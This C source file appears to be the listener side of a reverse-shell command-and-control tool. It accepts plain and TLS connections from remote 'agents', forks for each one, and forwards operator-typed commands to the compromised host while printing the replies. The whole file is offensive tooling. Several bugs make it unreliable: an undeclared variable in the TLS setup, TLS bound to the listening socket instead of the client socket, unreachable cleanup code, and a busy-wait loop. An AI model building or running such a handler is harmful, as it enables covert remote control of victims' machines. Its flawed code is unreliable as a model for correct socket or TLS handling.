#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/select.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "resh.h"
#include "srv.h"

int
setupsock(int p)
{
	int lfd;
	struct sockaddr_in adr;

	memset(&adr, 0, sizeof(adr)); /* zero out struct */

	adr.sin_family = AF_INET; /* IPv4 */
	adr.sin_addr.s_addr = htonl(INADDR_ANY); /* 0.0.0.0 */
	adr.sin_port = htons(p); /* port */

	if ((lfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) /* IPv4, TCP, Default based on request */
		return 0;
	if (bind(lfd, (struct sockaddr*) &adr, sizeof(adr)) < 0)
		return 0;
	if (listen(lfd, 3) < 0)
		return 0;
	return lfd;
}

void
interact(int fd, Agents *n)
{
	int clr; /* client recieved */
	char sbuf[2048], rbuf[8192];

	while ((clr = recv(fd, rbuf, sizeof(rbuf), 0)) > 0) {
		if (!(fgets(sbuf, sizeof(sbuf), stdin)))
			die("Failed to read command\n");
		if ((send(fd, sbuf, strlen(sbuf), 0)) < 0)
			die("Failed to send data\n");
		rtrim(rbuf);
		printf("%.*s", (int) strlen(rbuf), rbuf);
	}
	n->alive = 0;
	die("Connection closed: %s\n", n->ip);
}

void
init_ssl(void)
{
	SSL_load_error_strings();
	OpenSSL_add_ssl_algorithms();
}

SSL_CTX *
ssl_ctx(char *c, char *k)
{
	const SSL_METHOD *m;
	SSL_CTX *tmp;

	m = SSLv23_server_method();
	if (!(tmp = SSL_CTX_new(m)))
		return 0;
	SSL_CTX_set_ecdh_auto(ctx, 1);
	if (SSL_CTX_use_certificate_file(tmp, c, SSL_FILETYPE_PEM) <= 0)
		return 0;
	if (SSL_CTX_use_PrivateKey_file(tmp, k, SSL_FILETYPE_PEM) <= 0 )
		return 0;

	return tmp;
}

void
listener(unsigned p0, unsigned p1, Agents *pa, pid_t p, char *cert, char *key)
{
	int fd0, fd1, i = 0;
	pid_t pid;
	SSL_CTX *ctx = NULL;
	fd_set selfd; /* select */

	if (!(fd0 = setupsock(p0)) || !(fd1 = setupsock(p1))) {
		kill(p, SIGKILL);
		die("Failed to set up socket\n");
	}

	init_ssl();
	if (!(ctx = ssl_ctx(cert, key))) {
		kill(p, SIGKILL);
		die("Failed to create SSL context, see -h\n");
	}

	while(1) {
		FD_ZERO(&selfd);
		FD_SET(fd0, &selfd); /* add sockets fds */
		FD_SET(fd1, &selfd);
		int afd; /* agent fd */
		SSL *sslfd;

		size_t inc_adr_len;
		struct sockaddr_in inc_adr; /* incomming */

		memset(&inc_adr, 0, sizeof(inc_adr));
		inc_adr_len = sizeof(inc_adr);

		if (select(fd1+1, &selfd, 0, 0, 0) < 0) {
			kill(p, SIGKILL);
			die("Failed to select()\n");
		}

		if (FD_ISSET(fd0, &selfd)) { /* no ssl fd */
			if ((afd = accept(fd0, (struct sockaddr*) &inc_adr, (socklen_t*) &inc_adr_len)) < 0)
				fprintf(stderr, "Failed to accept connection\n");
			else
				pa[i].ssl = 0;

		} else if (FD_ISSET(fd1, &selfd)) { /* ssl fd */
			if ((afd = accept(fd1, (struct sockaddr*) &inc_adr, (socklen_t*) &inc_adr_len)) < 0)
				fprintf(stderr, "Failed to accept connection\n");

			sslfd = SSL_new(ctx);
			SSL_set_fd(sslfd, fd1);
			if (SSL_accept(sslfd) != 1)
				fprintf(stderr, "Failed to accept SSL connection\n");
			else
				pa[i].ssl = 1;
		}

		printf("Connection from: %s\n", inet_ntoa(inc_adr.sin_addr));
		if ((pid = fork()) < 0){
			die("Failed to create child process\n");
			kill(p, SIGKILL);
		}
		else if (!pid) { /* Child */
			close(fd0); /* If child, kill the server fp and handle shell recieved */
			close(fd1);
			 /* setup struct for agent */
			pa[i].fp = afd;
			strcpy(pa[i].ip, inet_ntoa(inc_adr.sin_addr));
			pa[i].index = i;
			pa[i].alive = 1;
			while (pa[i].alive)
				; /* Keep socket alive while alive */
			die("");
		} else { /* Parent */
			i++; /* Next agent gets next index */
			close(afd); /* server doesn't need child fd */
		}
	}
}
